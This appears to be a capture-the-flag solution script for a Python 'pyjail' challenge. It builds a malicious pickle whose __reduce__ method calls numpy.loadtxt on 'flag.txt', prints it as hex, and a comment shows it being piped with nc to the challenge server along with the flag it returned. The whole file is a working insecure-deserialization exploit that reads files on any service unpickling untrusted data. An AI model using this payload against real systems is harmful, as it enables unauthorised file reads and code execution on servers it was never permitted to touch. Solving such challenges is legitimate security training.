import pickle

import numpy


class FlagReader:

    def __reduce__(self):
        return (numpy.loadtxt, ('flag.txt', 'str'))


print(pickle.dumps(FlagReader()).hex())

# ❯ (python ./payload.py; cat) |  nc challs1.pyjail.club 5200
# (hex)> jail{idk_about_mag1c_but_this_is_definitely_pickled}
